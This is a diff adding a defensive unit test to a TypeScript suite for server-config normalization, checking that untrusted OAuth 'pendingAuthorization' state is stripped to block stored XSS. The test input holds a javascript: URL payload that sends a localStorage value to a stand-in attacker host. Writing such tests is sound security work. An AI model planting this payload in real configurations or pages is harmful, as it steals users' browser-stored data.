@@ -281,6 +281,23 @@ describe('normalizeServerConfigForPersistence', () => {
     expect(normalized.openapi?.specSecurity).toEqual(specSecurity);
   });
 
+  it('never accepts runtime pendingAuthorization state from API input (stored XSS)', () => {
+    const normalized = normalizeServerConfigForPersistence({
+      type: 'streamable-http',
+      url: 'https://mcp.example.com/mcp',
+      oauth: {
+        clientId: 'client-1',
+        pendingAuthorization: {
+          authorizationUrl: "javascript:fetch('https://attacker.example/?t='+localStorage.x)",
+          state: 'x',
+          discoveryState: { authorizationServerUrl: 'https://attacker.example' },
+        },
+      },
+    } as unknown as ServerConfig);
+
+    expect(normalized.oauth).toEqual({ clientId: 'client-1' });
+  });
+
   it('preserves oauth redirectUri and revocationEndpoint through normalization', () => {
     // These two fields are consumed downstream (redirectUri -> preferred redirect URI
     // for DCR/authorization URLs; revocationEndpoint -> token revocation on disconnect)
